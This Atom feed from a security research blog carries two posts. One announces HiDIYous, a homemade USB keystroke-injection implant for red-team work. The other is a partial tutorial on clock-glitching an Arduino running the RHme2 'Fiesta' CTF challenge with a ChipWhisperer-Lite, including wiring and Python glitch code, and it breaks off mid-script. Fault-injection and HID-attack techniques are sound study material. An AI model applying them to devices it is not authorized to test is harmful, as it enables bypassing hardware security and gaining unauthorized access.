<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.9.0">Jekyll</generator><link href="/feed.xml" rel="self" type="application/atom+xml" /><link href="/" rel="alternate" type="text/html" /><updated>2025-09-09T13:46:37+00:00</updated><id>/feed.xml</id><title type="html">Securityits.io</title><subtitle>Security researching from the nordics</subtitle><entry><title type="html">Its HiDIYous</title><link href="/its-hidiyous" rel="alternate" type="text/html" title="Its HiDIYous" /><published>2024-10-03T00:00:00+00:00</published><updated>2024-10-03T00:00:00+00:00</updated><id>/its-hidiyous</id><content type="html" xml:base="/its-hidiyous">&lt;blockquote&gt;
  &lt;p&gt;Its HiDIYous, but it works!…&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;HiDIYous was an internal project, that came about when we needed a USB implant that acted like a Human Interface Device (keyboard). The only issue was that the organization we where testing had a security posture that made it impossible to use any over the counter devices (Hak5 Rubberducky, OMG Cable etc.). This spawned the idea that I should design my own, that should be robust, easy and have a really small footprint so that it can be implanted into a lot of different host devices.&lt;/p&gt;

&lt;h2 id=&quot;what-is-a-human-interface-device-hid&quot;&gt;What is a Human Interface Device (HID)&lt;/h2&gt;

&lt;p&gt;A HID is any peripheral device that allows humans to interact with a computer by sending input data. Common examples include keyboards, mice, and game controllers. HIDs are trusted by operating systems by default, which means that they don’t require special drivers to function. This trust is central to how devices like the USB Rubber Ducky and the OMG Cable are able to exploit systems. These tools leverage the inherent trust computers place in HID devices to launch keystroke injection attacks. In this context, the HID protocol becomes a potential vector for delivering malicious commands, all while masquerading as a harmless device.&lt;/p&gt;

&lt;p&gt;The HiDIYous project take advantage of this by pretending to be standard keyboards, which allows them to execute commands or inject scripts once plugged into a target machine. This tool highlight a fundamental flaw in how computers trust HIDs, showcasing how these devices can be repurposed to bypass security measures and gain unauthorized access to systems.&lt;/p&gt;

&lt;h2 id=&quot;howto&quot;&gt;Howto?&lt;/h2&gt;
&lt;p&gt;So next  question is how do you get one? I published a Git Repo with all the instructions and files needed which can be found here:
&lt;a href=&quot;https://github.com/Securitybits-io/HiDIYous.git&quot;&gt;https://github.com/Securitybits-io/HiDIYous.git&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;The repo also contains instructions on how to build and create your first implant.&lt;/p&gt;</content><author><name>Christoffer Claesson</name></author><category term="redteam" /><category term="hardware" /><summary type="html">Its HiDIYous, but it works!…</summary></entry><entry><title type="html">Clock Glitching with a ChipWhisperer-Lite</title><link href="/Clock-Glitching-with-a-chipwhisperer" rel="alternate" type="text/html" title="Clock Glitching with a ChipWhisperer-Lite" /><published>2023-01-01T00:00:00+00:00</published><updated>2023-01-01T00:00:00+00:00</updated><id>/Clock-Glitching-with-a-chipwhisperer</id><content type="html" xml:base="/Clock-Glitching-with-a-chipwhisperer">&lt;blockquote&gt;
  &lt;p&gt;What happens when things get out of sync?… SCIENCE!&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;Purchasing a Chipwhisperer-lite and going through the Newae course is a really awesome experience. Though the course teach you alot obout each vulnerability and the Chipwhisperer API, I found it lacking alot in the “how to setup the hardware” department. So finishing up the course material, I’ve decided yet again to attack my favourite platform, the Arduino Uno and implement a bunch of the Riscure CTF challenges and yet again, attack the Fiesta challenge.&lt;/p&gt;

&lt;h2 id=&quot;what-is-clock-glitching&quot;&gt;What is Clock Glitching&lt;/h2&gt;

&lt;p&gt;All Microcontrollers are bound by operating out of a clock cycle, where one cycle is defined by a pulse. During the start of each pulse, the microcontroller is executing and fetching a new instruction. The start of a clock cycle is usually defined by a rising edge (binary 1) followed by a falling edge (binary 0), for the duration of a fixed time period. The amount of cycles per second defines the processors clock speed, for example the Atmega328p defaults to a 16MHz Clock speed, which means that it performs &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;16E6&lt;/code&gt; instructions per second.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;assets/images/posts/2023/01/clock-glitching-with-a-chipwhisperer/clock-cycle.jpg&quot; alt=&quot;Defined Clock Cycle&quot; /&gt;&lt;/p&gt;

&lt;p&gt;As with the Voltage Glitching in the post “&lt;a href=&quot;https://blog.securitybits.io/2019/06/voltage-glitching-on-the-cheap/&quot;&gt;Voltage glitching on the Cheap&lt;/a&gt;”, we defined that within a given set of parameters the hardware operates normally. But introducing faults into the voltage line corrupted the instructions enough to break out of the “Lock” loop. The same assumption is made with the clock line, that within a given set of parameters the hardware will operate normally.&lt;/p&gt;

&lt;p&gt;In order to create the “glitch” for our clock glitch to work, we must introduce an additional clock cycle to the microcontroller. By doing so, we can make the microcontroller to essentially “skip” a step in the execution.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;assets/images/posts/2023/01/clock-glitching-with-a-chipwhisperer/clock-glitch.jpg&quot; alt=&quot;Glitched Clock Cycle&quot; /&gt;&lt;/p&gt;

&lt;h2 id=&quot;setup&quot;&gt;Setup&lt;/h2&gt;

&lt;p&gt;Components needed:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;Arduino UNO&lt;/li&gt;
  &lt;li&gt;Chipwhisperer-Lite (or Pro)&lt;/li&gt;
  &lt;li&gt;Breadboard&lt;/li&gt;
  &lt;li&gt;DuPont Wires&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;(And some basic knowledge in Python and the Chipwhisperer API will not hurt)&lt;/p&gt;

&lt;p&gt;Again, lets start by loading the source code onto our victim Uno using avrdude:&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@linux:~# wget https://raw.githubusercontent.com/Riscure/Rhme-2016/master/challenges/binaries/fiesta/fiesta.hex
root@linux:~# avrdude -c arduino -p atmega328p -p /dev/&amp;lt;UNO Device&amp;gt; -b115200 -u -V -U flash:w:fiesta.hex
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Powering the Uno and connecting with your favourite serial terminal you should expect something like:&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@linux:~# screen /dev/ttyACM1 19200
RHME2 FI level 1.

Chip status: LockLockLockLockLockLockLockLockLockLockLockLockLockLock[...]
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Great, lets hook up our Chipwhisperer and get glitching!&lt;/p&gt;

&lt;h2 id=&quot;connecting-the-chipwhisperer&quot;&gt;Connecting the Chipwhisperer&lt;/h2&gt;

&lt;p&gt;The premise of the clock glitch, is to provide the clock source (CLK-SRC) from the Chipwhisperer, in order to control the clock pulses. We also want to use the Arduino UNO baseboard in order to power she Atmega328p as the Chipwhisperer-Lite are no able to provide the 5v output required.&lt;/p&gt;

&lt;p&gt;Connecting the CW-Lite and Uno according to the scheme below, will ensure that the chip have a stable power connection, as well as the ability to receive a clock input from the CW-Lite.&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;CW-Lite   &amp;lt;&amp;gt;   Atmega328p   &amp;lt;&amp;gt;  [Uno Baseboard]
2  (GND)   &amp;gt;    8  (GND)    &amp;lt;       [GND]
5  (NRST)  &amp;gt;    1  (RST)    
6  (HS2)   &amp;gt;    9  (TOSC1)
12 (IO2)   &amp;gt;    3  (TXD)
                7  (VCC)    &amp;lt;       [5v]
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;According to the following diagram:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;assets/images/posts/2023/01/clock-glitching-with-a-chipwhisperer/Arduino-Uno-ATmega328P-Pin-Mapping1_o.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Just to go into some further detail before we jump into the code about why we connect the pins the way we do. First of all we would like the CW-Lite and the Atmega328p to share a common &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;2 GND &amp;lt;&amp;gt; 8 GND&lt;/code&gt;, it makes life a bit simpler in this case.&lt;/p&gt;

&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;NRST &amp;lt;&amp;gt; RST&lt;/code&gt; pins are connected so that we are able to programmtically reset the target, according to the &lt;a href=&quot;https://ww1.microchip.com/downloads/en/DeviceDoc/Atmel-7810-Automotive-Microcontrollers-ATmega328P_Datasheet.pdf&quot;&gt;Atmega328p Datasheet&lt;/a&gt; if the RST pin is LOW, the device will reset. Which is beneficial to us as we can utilize that in case of the device starts misbehaving in a way we dont want (See function &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;reboot_flush()&lt;/code&gt; in the later code). But that also means that the RST pin need to be HIGH in order for the device to operate.&lt;/p&gt;

&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;HS2/OUT &amp;lt;&amp;gt; TOSC1&lt;/code&gt; is the actual Clock Source for the Atmega328p which we will manipulate.&lt;/p&gt;

&lt;p&gt;The final pins &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;IO2 &amp;lt;&amp;gt; TXD&lt;/code&gt; is used to capture the flag and Serial output of the Atmega328p in order to see if we are successful in our attempts to glitch past the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;LockLockLock&lt;/code&gt; message.&lt;/p&gt;

&lt;p&gt;Heres a complete picture of the setup:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;assets/images/posts/2023/01/clock-glitching-with-a-chipwhisperer/physical_setup.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;h2 id=&quot;glitching-time&quot;&gt;Glitching Time&lt;/h2&gt;

&lt;p&gt;So we will be using a Chipwhisperer (If it wasn’t obvious already), the CW-Lite API and Python3 in order to create our Glitch loop. While it might look confusing at first, we’ll go through a couple key points in the code.&lt;/p&gt;

&lt;h3 id=&quot;scope-setup&quot;&gt;Scope Setup&lt;/h3&gt;

&lt;p&gt;The first thing we’ll do after connecting to the device is to run a &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;scope.default_setup&lt;/code&gt; so that we do not have any lingering configurations lying around. We then move on to defining some of the GPIO pins, which is the same as the connection scheme before:&lt;/p&gt;

&lt;h4 id=&quot;gpio&quot;&gt;GPIO&lt;/h4&gt;

&lt;ul&gt;
  &lt;li&gt;TIO1 &amp;gt; Serial_Tx&lt;/li&gt;
  &lt;li&gt;TIO2 &amp;gt; Serial_Rx&lt;/li&gt;
  &lt;li&gt;NRST &amp;gt; High (Because otherwise the Arduino will be stuck in reset loop)&lt;/li&gt;
  &lt;li&gt;HS2  &amp;gt; Glitch (For the clock output)&lt;/li&gt;
&lt;/ul&gt;

&lt;h4 id=&quot;glitch-design&quot;&gt;Glitch design&lt;/h4&gt;

&lt;p&gt;The next part is actually defining how the glitch will look like, and where the chipwhisperer is pulling its clock sync from. The parameter &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;clk_src&lt;/code&gt; which is set to &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;clkgen&lt;/code&gt; tells the CW-Lite that it should provide the target with a clock signal. The parameter &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;clkgen_freq&lt;/code&gt; determines what frequency the clock signal should be at. This is something that we can use an oscilloscope or similar to determine, but according to the datasheet the Atmega328p runs at 16MHz or &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;16E6&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;The complete scope setup should look something like:&lt;/p&gt;

&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;    &lt;span class=&quot;n&quot;&gt;scope&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;adc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;timeout&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mf&quot;&gt;0.1&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;scope&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;io&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;nrst&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;high&quot;&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;scope&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;io&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;tio1&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;serial_tx&quot;&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;scope&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;io&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;tio2&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;serial_rx&quot;&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;scope&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;io&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;tio4&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;high_z&quot;&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;scope&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;io&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;hs2&lt;/span&gt;  &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;glitch&quot;&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;scope&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;glitch&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;clk_src&lt;/span&gt;     &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;clkgen&quot;&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;scope&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;glitch&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;trigger_src&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;manual&quot;&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;scope&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;glitch&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;repeat&lt;/span&gt;      &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;scope&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;glitch&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;output&lt;/span&gt;      &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;clock_xor&quot;&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;scope&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;clock&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;clkgen_freq&lt;/span&gt;  &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mf&quot;&gt;16E6&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h4 id=&quot;glitch-time-and-shape&quot;&gt;Glitch Time and Shape&lt;/h4&gt;

&lt;p&gt;The following lines of code are responsible for the timing of the glitch, and the shape of it.&lt;/p&gt;

&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;    &lt;span class=&quot;n&quot;&gt;gc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;set_range&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;width&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;40&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;40&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;gc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;set_range&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;offset&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;35&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;25&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;gc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;set_range&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;ext_offset&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;5&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;10&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;gc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;set_global_step&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;scope&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;glitch&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;repeat&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;10&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;These are the settings that worked for me, but your mileage may vary. Recommend tweaking &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ext_offset&lt;/code&gt; and increase the span of &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;offset&lt;/code&gt; in order to vary the place of the glitch.&lt;/p&gt;

&lt;h4 id=&quot;reset-function&quot;&gt;Reset Function&lt;/h4&gt;

&lt;p&gt;The &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;reboot_flush()&lt;/code&gt; function is defined according to the Atmega328p datasheet, where a chip reset occurs when the RST pin is set to &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;low&lt;/code&gt; for more than a clock cycle and brought to &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;high_z&lt;/code&gt;. The function is nice to have so that each execution of the glitch script works of a fresh slate for the microcontroller. But the function can also be used if the glitch cycle would be corrupting anything in the program memory which is not beneficial to us.&lt;/p&gt;

&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;    &lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;reboot_flush&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;():&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;scope&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;io&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;nrst&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;low&quot;&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;time&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sleep&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mf&quot;&gt;0.05&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;scope&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;io&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;nrst&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;high_z&quot;&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;time&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sleep&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mf&quot;&gt;0.05&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;target&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;flush&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h3 id=&quot;creating-the-glitch&quot;&gt;Creating the glitch&lt;/h3&gt;

&lt;p&gt;Putting it all together should look something like this:&lt;/p&gt;

&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;    &lt;span class=&quot;c1&quot;&gt;#!/usr/bin/env python3
&lt;/span&gt;
    &lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;chipwhisperer&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;as&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;cw&lt;/span&gt;
    &lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;chipwhisperer.common.results.glitch&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;as&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;glitch&lt;/span&gt;
    &lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;time&lt;/span&gt;
    &lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;logging&lt;/span&gt;

    &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;[+] Atmega328P Clock Glitch&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;[+] Written for https://Blog.Securitybits.io&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;

    &lt;span class=&quot;n&quot;&gt;scope&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;bp&quot;&gt;None&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;scope&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;cw&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;scope&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;

    &lt;span class=&quot;k&quot;&gt;assert&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;scope&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt; &lt;span class=&quot;bp&quot;&gt;None&lt;/span&gt;

    &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;[+] Connected to Chipwhisperer&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;scope&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;default_setup&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;

    &lt;span class=&quot;n&quot;&gt;scope&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;adc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;timeout&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mf&quot;&gt;0.1&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;scope&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;io&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;nrst&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;high&quot;&lt;/span&gt;          &lt;span class=&quot;c1&quot;&gt;# Pin 1 on DUT
&lt;/span&gt;    &lt;span class=&quot;n&quot;&gt;scope&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;io&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;tio1&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;serial_tx&quot;&lt;/span&gt;     
    &lt;span class=&quot;n&quot;&gt;scope&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;io&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;tio2&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;serial_rx&quot;&lt;/span&gt;     &lt;span class=&quot;c1&quot;&gt;# Pin 3 on DUT
&lt;/span&gt;    &lt;span class=&quot;n&quot;&gt;scope&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;io&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;tio4&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;high_z&quot;&lt;/span&gt;
